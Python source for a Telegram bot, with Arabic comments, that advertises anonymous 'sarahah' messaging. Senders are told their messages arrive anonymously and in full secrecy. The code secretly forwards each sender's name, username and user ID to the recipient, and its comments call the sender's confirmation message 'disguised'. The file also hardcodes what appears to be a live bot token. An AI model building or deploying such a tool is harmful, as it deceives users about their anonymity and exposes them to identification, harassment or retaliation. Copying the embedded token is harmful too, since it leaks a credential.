
import telebot
from telebot import types
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

# التوكن واليوزر الخاصين ببوتك
BOT_TOKEN = "8682801321:AAEBx5KjhdYSVCZMZIJck-JgM36Osr_Bz2Y"
BOT_USERNAME = "Sarrh1bot"

bot = telebot.TeleBot(BOT_TOKEN)

# قاعدة بيانات مؤقتة في الذاكرة لتخزين الحظر والرسائل والحالات
users_db = {}      
messages_db = {}   
user_states = {}   # لتخزين الشخص اللي بنرسل له {sender_id: target_id}
msg_counter = 0

# ----------------- خدعة فتح الـ Port للاستضافة -----------------
class DummyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"Bot is running perfectly!")

def run_dummy_server():
    import os
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(("0.0.0.0", port), DummyServer)
    print(f"🌍 تم تشغيل سيرفر وهمي على المنفذ: {port}")
    server.serve_forever()
# -----------------------------------------------------------

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    text_args = message.text.split()
    
    if user_id not in users_db:
        users_db[user_id] = {"blocked_users": set()}
        
    # إذا دخل المستخدم عن طريق رابط حساب شخص آخر
    if len(text_args) > 1 and text_args[1].isdigit():
        target_id = int(text_args[1])
        
        if target_id == user_id:
            bot.send_message(user_id, "❌ لا يمكنك إرسال رسالة صراحة لنفسك!")
            return
            
        # حفظ الوجهة في الذاكرة وتغيير حالة المستخدم
        user_states[user_id] = target_id
        bot.send_message(user_id, "✍️ أرسل رسالتك الآن، وسيتم تسليمها بشكل مجهول وسري تماماً:")
        return

    # عرض رابط الاستقبال الخاص بالمستخدم
    share_link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
    welcome_text = (
        "👋 أهلاً بك في بوت الصراحة والرسائل المجهولة!\n\n"
        f"🔗 الرابط الخاص بك لاستقبال الرسائل هو:\n`{share_link}`\n\n"
        "انشره في حساباتك لتبدأ في استقبال رسائل مجهولة وسرية من أصدقائك."
    )
    bot.send_message(user_id, welcome_text, parse_mode="Markdown")

# معالج استقبال الرسائل الموجهة (بديل register_next_step عشان نضمن الفصل)
@bot.message_handler(func=lambda message: message.from_user.id in user_states)
def handle_anonymous_routing(message):
    global msg_counter
    sender_id = message.from_user.id
    target_id = user_states[sender_id] # جلب الشخص المستهدف

    # التحقق من الحظر
    if target_id in users_db and sender_id in users_db[target_id]["blocked_users"]:
        bot.send_message(sender_id, "❌ عذراً، لا يمكنك إرسال رسالة لهذا المستخدم.")
        # إنهاء الحالة
        del user_states[sender_id]
        return

    if message.content_type != 'text':
        bot.send_message(sender_id, "⚠️ البوت يدعم الرسائل النصية فقط حالياً.")
        return

    msg_counter += 1
    messages_db[msg_counter] = sender_id

    # إنشاء زر الحظر التفاعلي
    markup = types.InlineKeyboardMarkup()
    block_button = types.InlineKeyboardButton(
        text="🚫 حظر هذا المستخدم", 
        callback_data=f"toggleblock_{msg_counter}"
    )
    markup.add(block_button)

    first_name = message.from_user.first_name
    username = f"@{message.from_user.username}" if message.from_user.username else "لا يوجد معرف"
    
    # رسالة كشف الهوية الموجهة لك أنت فقط (تُرسل لـ target_id)
    info_text = (
        f"📩 **وصلتك رسالة صراحة جديدة!**\n\n"
        f"💬 **الرسالة:** {message.text}\n\n"
        f"─── معلومات المُرسِل السرية ───\n"
        f"👤 **الاسم:** {first_name}\n"
        f"🔗 **المعرف:** {username}\n"
        f"🆔 **الـ ID:** `{sender_id}`"
    )

    try:
        # إرسال البيانات لك بشكل منفصل تماماً عن محادثة المرسل
        bot.send_message(chat_id=target_id, text=info_text, reply_markup=markup, parse_mode="Markdown")
        
        # إرسال رسالة التأكيد المموّهة للمرسل (صاحبتك) في شاتها الخاص
        bot.send_message(chat_id=sender_id, text="✅ تم إرسال رسالتك بنجاح وبسرية تامة!")
    except Exception as e:
        bot.send_message(chat_id=sender_id, text="❌ فشل إرسال الرسالة، قد يكون المستخدم قام بتعطيل البوت.")
    
    # مسح حالة الإرسال بعد النجاح حتى يستطيع استخدام البوت طبيعي مجدداً
    del user_states[sender_id]

@bot.callback_query_handler(func=lambda call: call.data.startswith('toggleblock_'))
def handle_toggle_block_callback(call):
    receiver_id = call.from_user.id
    msg_id = int(call.data.split('_')[1])
    
    sender_id = messages_db.get(msg_id)
    
    if not sender_id:
        bot.answer_callback_query(call.id, "⚠️ انتهت صلاحية هذا الإجراء أو البيانات غير متوفرة.")
        return

    if receiver_id not in users_db:
        users_db[receiver_id] = {"blocked_users": set()}

    markup = types.InlineKeyboardMarkup()
    
    # فك الحظر
    if sender_id in users_db[receiver_id]["blocked_users"]:
        users_db[receiver_id]["blocked_users"].remove(sender_id)
        btn = types.InlineKeyboardButton(text="🚫 حظر هذا المستخدم", callback_data=f"toggleblock_{msg_id}")
        markup.add(btn)
        
        clean_text = call.message.text.replace("\n\n🚫 [هذا المستخدم محظور حالياً]", "")
        bot.edit_message_text(chat_id=receiver_id, message_id=call.message.message_id, text=clean_text, reply_markup=markup)
        bot.answer_callback_query(call.id, "🟢 تم إلغاء الحظر بنجاح!")
        
    # الحظر
    else:
        users_db[receiver_id]["blocked_users"].add(sender_id)
        btn = types.InlineKeyboardButton(text="🟢 إلغاء حظر هذا المستخدم", callback_data=f"toggleblock_{msg_id}")
        markup.add(btn)
        
        bot.edit_message_text(
            chat_id=receiver_id, 
            message_id=call.message.message_id, 
            text=f"{call.message.text}\n\n🚫 [هذا المستخدم محظور حالياً]", 
            reply_markup=markup
        )
        bot.answer_callback_query(call.id, "🚫 تم حظر المستخدم!")

if __name__ == "__main__":
    print("🧹 جاري حذف الـ Webhook القديم وتنظيف الاتصال بالخادم...")
    try:
        bot.delete_webhook(drop_pending_updates=True)
        print("✅ تم تنظيف الاتصال بنجاح!")
    except Exception as e:
        print(f"⚠️ فشل حذف الـ Webhook: {e}")
        
    threading.Thread(target=run_dummy_server, daemon=True).start()
    print("🤖 البوت يعمل بنظام الحالات المفصولة والمموّهة بالكامل...")
    bot.infinity_polling()
